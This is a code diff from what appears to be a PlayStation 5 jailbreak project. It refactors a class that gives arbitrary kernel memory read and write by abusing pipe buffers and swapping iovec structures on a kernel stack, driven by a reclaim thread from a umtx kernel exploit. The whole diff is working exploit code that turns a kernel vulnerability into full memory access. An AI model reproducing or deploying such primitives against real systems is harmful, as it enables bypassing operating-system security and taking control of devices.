@@ -1,18 +1,19 @@
-package org.ps5jb.client.payloads.umtx.impl2;
+package org.ps5jb.client.payloads.umtx.common;
 
 import java.io.IOException;
 import java.io.NotActiveException;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 
-import org.ps5jb.client.payloads.umtx.common.DebugStatus;
 import org.ps5jb.loader.KernelAccessor;
 import org.ps5jb.sdk.core.Pointer;
 import org.ps5jb.sdk.core.SdkRuntimeException;
+import org.ps5jb.sdk.include.machine.Param;
+import org.ps5jb.sdk.include.sys.Pipe;
 import org.ps5jb.sdk.include.sys.uio.UioType;
 import org.ps5jb.sdk.lib.LibKernel;
 
-class KernelAccessorSlow implements KernelAccessor {
+public class KernelAccessorSlow implements KernelAccessor {
     private static final long OFFSET_IOV_BASE = 0x00;
     private static final long OFFSET_IOV_LEN = 0x08;
     private static final long SIZE_IOV = 0x10;
@@ -20,39 +21,35 @@ class KernelAccessorSlow implements KernelAccessor {
     private static final long OFFSET_UIO_SEGFLG = 0x20;
     private static final long OFFSET_UIO_RW = 0x24;
 
-    private final UmtxExploitJob.KPrimThreadData kPrimThreadData;
+    private final CommandProcessor commandProcessor;
     private final Pointer kstack;
     private final LibKernel libKernel;
     private long kernelBase;
 
-    KernelAccessorSlow(UmtxExploitJob.KPrimThreadData kPrimThreadData, Pointer kstack) {
-        this.kPrimThreadData = kPrimThreadData;
+    public KernelAccessorSlow(CommandProcessor commandProcessor, Pointer kstack) {
+        this.commandProcessor = commandProcessor;
         this.kstack = kstack;
         this.libKernel = new LibKernel();
     }
 
     private void sendCommand(int cmd, long uaddr, long kaddr, int len) {
-        if (len > UmtxExploitJob.KPRIM_BUF_SIZE) {
-            throw new IllegalArgumentException("Length cannot be greater than " + UmtxExploitJob.KPRIM_BUF_SIZE);
-        }
-
         // Protection against deadlock
-        if (kPrimThreadData.cmd.get() != UmtxExploitJob.KPRIM_NOP) {
+        if (commandProcessor.cmd.get() != CommandProcessor.KPRIM_NOP) {
             throw new IllegalStateException("Reclaim thread not yet reset");
         }
 
         // Set args
-        kPrimThreadData.uaddr.set(uaddr);
-        kPrimThreadData.kaddr.set(kaddr);
-        kPrimThreadData.len.set(len);
+        commandProcessor.uaddr.set(uaddr);
+        commandProcessor.kaddr.set(kaddr);
+        commandProcessor.len.set(len);
 
         // Set command, we do this last because it kickstarts the thread to do stuff
-        kPrimThreadData.cmd.set(cmd);
+        commandProcessor.cmd.set(cmd);
 
         // Give some time to the thread to process the command
         sleep(50L);
         if (DebugStatus.isTraceEnabled()) {
-            DebugStatus.trace("[+] kprim send (" + cmd + ", 0x" + Long.toHexString(uaddr) + ", 0x" + Long.toHexString(kaddr) + "), len=" + len + ", read=" + kPrimThreadData.readCounter.get() + ", write=" + kPrimThreadData.writeCounter.get());
+            DebugStatus.trace("[+] kprim send (" + cmd + ", 0x" + Long.toHexString(uaddr) + ", 0x" + Long.toHexString(kaddr) + "), len=" + len + ", read=" + commandProcessor.readCounter.get() + ", write=" + commandProcessor.writeCounter.get());
         }
     }
 
@@ -94,13 +91,13 @@ class KernelAccessorSlow implements KernelAccessor {
     synchronized void slowCopyOut(long kaddr, Pointer uaddr, int len) {
         // Fill pipe up to max
         long totalGarbageSize = 0;
-        for (long i = 0; i < UmtxExploitJob.PIPE_SLOW_SIZE; i += UmtxExploitJob.PIPE_SLOW_BATCH_SIZE) {
-            long writeBytes = libKernel.write(kPrimThreadData.pipeSlowWriteFd, kPrimThreadData.pipeSlowScratchBuf, UmtxExploitJob.PIPE_SLOW_BATCH_SIZE);
-            if (writeBytes != UmtxExploitJob.PIPE_SLOW_BATCH_SIZE) {
+        for (long i = 0; i < Pipe.BIG_PIPE_SIZE; i += Param.PHYS_PAGE_SIZE) {
+            long writeBytes = libKernel.write(this.commandProcessor.pipeWriteFd, this.commandProcessor.pipeScratchBuf, Param.PHYS_PAGE_SIZE);
+            if (writeBytes != Param.PHYS_PAGE_SIZE) {
                 throw new SdkRuntimeException("Unable to fill write pipe with garbage data");
             }
             if (DebugStatus.isTraceEnabled()) {
-                DebugStatus.trace("Written " + writeBytes + " to pipe fd #" + kPrimThreadData.pipeSlowWriteFd);
+                DebugStatus.trace("Written " + writeBytes + " to pipe fd #" + this.commandProcessor.pipeWriteFd);
             }
             totalGarbageSize += writeBytes;
         }
@@ -109,23 +106,23 @@ class KernelAccessorSlow implements KernelAccessor {
         }
 
         // Signal other thread to write using size we want, the thread will hang until we read
-        sendCommand(UmtxExploitJob.KPRIM_READ, uaddr.addr(), kaddr, len);
+        sendCommand(CommandProcessor.KPRIM_READ, uaddr.addr(), kaddr, len);
 
-        if (!swapIovInKstack(kPrimThreadData.pipeSlowScratchBuf.addr(), kaddr, 1, 1, len)) {
+        if (!swapIovInKstack(this.commandProcessor.pipeScratchBuf.addr(), kaddr, 1, 1, len)) {
             SdkRuntimeException rootEx = new SdkRuntimeException("Unable to swap iov, pattern not found");
             SdkRuntimeException causeEx = new SdkRuntimeException("Unable to unblock the write pipe following a failed read attempt. Deadlock may occur", rootEx);
             // Unblock the thread
-            if (libKernel.read(kPrimThreadData.pipeSlowReadFd, kPrimThreadData.pipeSlowScratchBuf, totalGarbageSize) != totalGarbageSize) {
+            if (libKernel.read(this.commandProcessor.pipeReadFd, this.commandProcessor.pipeScratchBuf, totalGarbageSize) != totalGarbageSize) {
                 throw causeEx;
             }
-            if (libKernel.read(kPrimThreadData.pipeSlowReadFd, uaddr, len) != len) {
+            if (libKernel.read(this.commandProcessor.pipeReadFd, uaddr, len) != len) {
                 throw causeEx;
             }
             throw rootEx;
         }
 
         // Read garbage filler data
-        long readGarbageSize = libKernel.read(kPrimThreadData.pipeSlowReadFd, kPrimThreadData.pipeSlowScratchBuf, totalGarbageSize);
+        long readGarbageSize = libKernel.read(this.commandProcessor.pipeReadFd, this.commandProcessor.pipeScratchBuf, totalGarbageSize);
         if (readGarbageSize != totalGarbageSize) {
             throw new SdkRuntimeException("Unable to unlock the write pipe. Read: " + readGarbageSize + ". Expected: " + totalGarbageSize);
         }
@@ -134,7 +131,7 @@ class KernelAccessorSlow implements KernelAccessor {
         }
 
         // Read kernel data
-        long read = libKernel.read(kPrimThreadData.pipeSlowReadFd, uaddr, len);
+        long read = libKernel.read(this.commandProcessor.pipeReadFd, uaddr, len);
         if (read != len) {
             throw new SdkRuntimeException("Unexpected number of bytes read: " + read + " instead of " + len);
         }
@@ -143,33 +140,33 @@ class KernelAccessorSlow implements KernelAccessor {
         }
 
         // Wait on kprim thread to reset
-        while (kPrimThreadData.cmd.get() != UmtxExploitJob.KPRIM_NOP) {
+        while (this.commandProcessor.cmd.get() != CommandProcessor.KPRIM_NOP) {
             sleep(50L);
         }
     }
 
     synchronized void slowCopyIn(Pointer uaddr, long kaddr, int len) {
         // Signal other thread to read using size we want, the thread will hang until we write
-        sendCommand(UmtxExploitJob.KPRIM_WRITE, uaddr.addr(), kaddr, len);
+        sendCommand(CommandProcessor.KPRIM_WRITE, uaddr.addr(), kaddr, len);
 
-        if (!swapIovInKstack(kPrimThreadData.pipeSlowScratchBuf.addr(), kaddr, 1, 0, len)) {
+        if (!swapIovInKstack(this.commandProcessor.pipeScratchBuf.addr(), kaddr, 1, 0, len)) {
             SdkRuntimeException rootEx = new SdkRuntimeException("Unable to swap iov, pattern not found");
             SdkRuntimeException causeEx = new SdkRuntimeException("Unable to unblock the read pipe following a failed write attempt. Deadlock may occur", rootEx);
             // Unblock the thread
-            if (libKernel.write(kPrimThreadData.pipeSlowWriteFd, uaddr, len) != len) {
+            if (libKernel.write(this.commandProcessor.pipeWriteFd, uaddr, len) != len) {
                 throw causeEx;
             }
             throw rootEx;
         }
 
         // Write data to write to pointer
-        long written = libKernel.write(kPrimThreadData.pipeSlowWriteFd, uaddr, len);
+        long written = libKernel.write(this.commandProcessor.pipeWriteFd, uaddr, len);
         if (written != len) {
             throw new SdkRuntimeException("Unexpected number of bytes written: " + written + " instead of " + len);
         }
 
         // Wait on kprim thread to reset
-        while (kPrimThreadData.cmd.get() != UmtxExploitJob.KPRIM_NOP) {
+        while (this.commandProcessor.cmd.get() != CommandProcessor.KPRIM_NOP) {
             sleep(50L);
         }
     }
@@ -184,50 +181,50 @@ class KernelAccessorSlow implements KernelAccessor {
 
     @Override
     public byte read1(long kernelAddress) {
-        slowCopyOut(kernelAddress, kPrimThreadData.slowReadValue, 1);
-        return kPrimThreadData.slowReadValue.read1();
+        slowCopyOut(kernelAddress, this.commandProcessor.readValue, 1);
+        return this.commandProcessor.readValue.read1();
     }
 
     @Override
     public short read2(long kernelAddress) {
-        slowCopyOut(kernelAddress, kPrimThreadData.slowReadValue, 2);
-        return kPrimThreadData.slowReadValue.read2();
+        slowCopyOut(kernelAddress, this.commandProcessor.readValue, 2);
+        return this.commandProcessor.readValue.read2();
     }
 
     @Override
     public int read4(long kernelAddress) {
-        slowCopyOut(kernelAddress, kPrimThreadData.slowReadValue, 4);
-        return kPrimThreadData.slowReadValue.read4();
+        slowCopyOut(kernelAddress, this.commandProcessor.readValue, 4);
+        return this.commandProcessor.readValue.read4();
     }
 
     @Override
     public long read8(long kernelAddress) {
-        slowCopyOut(kernelAddress, kPrimThreadData.slowReadValue, 8);
-        return kPrimThreadData.slowReadValue.read8();
+        slowCopyOut(kernelAddress, this.commandProcessor.readValue, 8);
+        return this.commandProcessor.readValue.read8();
     }
 
     @Override
     public void write1(long kernelAddress, byte value) {
-        kPrimThreadData.slowWriteValue.write1(value);
-        slowCopyIn(kPrimThreadData.slowWriteValue, kernelAddress, 1);
+        this.commandProcessor.writeValue.write1(value);
+        slowCopyIn(this.commandProcessor.writeValue, kernelAddress, 1);
     }
 
     @Override
     public void write2(long kernelAddress, short value) {
-        kPrimThreadData.slowWriteValue.write2(value);
-        slowCopyIn(kPrimThreadData.slowWriteValue, kernelAddress, 2);
+        this.commandProcessor.writeValue.write2(value);
+        slowCopyIn(this.commandProcessor.writeValue, kernelAddress, 2);
     }
 
     @Override
     public void write4(long kernelAddress, int value) {
-        kPrimThreadData.slowWriteValue.write4(value);
-        slowCopyIn(kPrimThreadData.slowWriteValue, kernelAddress, 4);
+        this.commandProcessor.writeValue.write4(value);
+        slowCopyIn(this.commandProcessor.writeValue, kernelAddress, 4);
     }
 
     @Override
     public void write8(long kernelAddress, long value) {
-        kPrimThreadData.slowWriteValue.write8(value);
-        slowCopyIn(kPrimThreadData.slowWriteValue, kernelAddress, 8);
+        this.commandProcessor.writeValue.write8(value);
+        slowCopyIn(this.commandProcessor.writeValue, kernelAddress, 8);
     }
 
     @Override
